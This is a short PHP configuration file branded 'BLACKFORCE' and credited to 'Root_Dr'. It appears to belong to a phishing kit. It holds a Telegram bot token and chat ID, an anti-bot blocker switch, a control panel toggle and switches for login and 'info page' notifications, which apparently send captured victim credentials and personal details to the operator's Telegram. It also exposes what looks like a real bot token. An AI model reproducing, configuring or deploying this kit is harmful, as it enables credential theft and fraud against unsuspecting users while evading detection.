<?php
/*
  ____  _        _    ____ _  _______ ___  ____   ____ _____ 
 | __ )| |      / \  / ___| |/ /  ___/ _ \|  _ \ / ___| ____|
 |  _ \| |     / _ \| |   | ' /| |_ | | | | |_) | |   |  _|  
 | |_) | |___ / ___ \ |___| . \|  _|| |_| |  _ <| |___| |___ 
 |____/|_____/_/   \_\____|_|\_\_|   \___/|_| \_\\____|_____|
 Coded By Root_Dr
DM:@Root_Dr                                                              
*/
require_once "../cors.php";

$config = [
    /* TeLegram Token & chatid */
    'TOKEN' => '8719916002:AAHVmFDSkL0ybI2mnJGn-ExWO8-XElLJt0U',
    'CHATID' => '8537634755',

    /* Antibots Blocker => true / false */
    'ANTIBOTS' => true,

    /* Antibots Blocker => true / false */
    'PHONE' => false,

    /* TeLegram Notif => true / false */
    'NOTIF' => true, 

    /* Panel Control => true / false */
    'PANEL' => true, 

    /* Info's Page => true / false */
    'INFOZ_PAGE' => true, 
    'INFO_NOTIF' => true, 

    /* Login Notif Page => true / false */
    'LOGIN_NOTIF' => true, 
]; 
echo json_encode($config);
?>